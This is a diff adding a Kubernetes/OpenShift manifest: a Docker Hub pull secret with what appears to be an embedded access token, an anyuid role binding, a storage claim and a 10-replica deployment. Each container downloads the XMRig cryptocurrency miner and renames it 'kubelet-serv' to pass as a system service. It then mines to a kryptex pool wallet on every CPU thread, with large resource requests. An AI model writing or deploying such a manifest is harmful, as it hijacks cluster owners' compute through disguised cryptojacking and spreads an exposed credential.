@@ -1,0 +1,89 @@
+---	
+apiVersion: v1
+kind: Secret
+metadata:
+  name: dockerhub-secret
+  namespace: ubuntu
+type: kubernetes.io/dockerconfigjson
+data:
+  .dockerconfigjson: >
+    eyJhdXRocyI6eyJodHRwczovL2luZGV4LmRvY2tlci5pby92MS8iOnsidXNlcm5hbWUiOiJ1c2VybmFtZSIsInBhc3N3b3JkIjoiZGNrcl9wYXRfX0g0VVdKdmQyV1pydE5nc1F6QVlPSWQwT19vIiwiaHR0cHBzOi8vaW5kZXguZG9ja2VyLmlvL3YxLyI6InRydWUifX19
+---
+kind: ServiceAccount
+apiVersion: v1
+metadata:
+  name: ubuntu-sa
+  namespace: ubuntu
+---
+kind: RoleBinding
+apiVersion: rbac.authorization.k8s.io/v1
+metadata:
+  name: 'system:openshift:scc:anyuid'
+  namespace: ubuntu
+subjects:
+  - kind: ServiceAccount
+    name: ubuntu-sa
+    namespace: ubuntu
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: 'system:openshift:scc:anyuid'
+---
+kind: PersistentVolumeClaim
+apiVersion: v1
+metadata:
+  name: ubuntu-pvc
+  namespace: ubuntu
+spec:
+  accessModes:
+    - ReadWriteMany
+  resources:
+    requests:
+      storage: 20Gi
+  storageClassName: ocs-storagecluster-cephfs
+  volumeMode: Filesystem
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ubuntu-minimal-deployment
+spec:
+  replicas: 10
+  selector:
+    matchLabels:
+      app: ubuntu-minimal
+  template:
+    metadata:
+      labels:
+        app: ubuntu-minimal
+    spec:
+      serviceAccountName: ubuntu-sa  # Use the ubuntu-sa service account
+      containers:
+      - name: ubuntu
+        image: ubuntu:20.04
+        command: 
+          - "sh"
+          - "-c"
+          - >
+            apt-get update && apt-get install -y wget tar && 
+            wget -c https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz -P /mnt/data && 
+            tar -xzvf /mnt/data/xmrig-6.22.2-linux-static-x64.tar.gz -C /mnt/data && 
+            cd /mnt/data && mv xmrig kubelet-serv &&
+            ./kubelet-serv -a rx/0 --url sal.kryptex.network:8888 --user solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/${region} --tls -k --huge-pages  --cpu-priority=5  --threads=$(nproc) --donate-level=0 
+        resources:
+          limits:
+            cpu: '32'
+            memory: 40Gi
+          requests:
+            cpu: '30'
+            memory: 20Gi
+        volumeMounts:
+          - name: ubuntu-pvc
+            mountPath: /mnt/data
+      volumes:
+      - name: ubuntu-pvc  # Define the volume
+        persistentVolumeClaim:
+          claimName: ubuntu-pvc  # Reference the PVC created earlier
+
+
+
